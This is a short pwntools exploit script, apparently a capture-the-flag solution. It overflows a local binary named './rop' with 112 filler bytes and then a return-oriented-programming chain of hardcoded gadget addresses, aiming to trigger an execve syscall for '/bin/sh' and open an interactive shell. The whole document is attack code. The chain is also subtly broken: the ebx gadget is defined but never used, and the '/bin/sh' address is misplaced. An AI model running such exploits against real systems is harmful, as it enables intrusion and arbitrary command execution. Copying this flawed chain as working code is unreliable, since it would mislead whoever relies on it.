from pwn import *
sh = process ('./rop')
pop_eax_ret = 0x080bb196
pop_ebx_ret = 0x080481c9
pop_ecx_ret = 0x0806eb91
pop_edx_ret = 0x0806eb6a
int_0x80 = 0x08049421
binsh_ret = 0x080be408
payload = b'a' * 112

payload += p32(pop_eax_ret)
payload += p32(0x0B)

payload += p32(pop_ecx_ret)
payload += p32(0)
payload += p32(0x080be408)

payload += p32(pop_edx_ret)
payload += p32(0)
payload += p32(int_0x80)
sh.sendline(payload)
sh.interactive()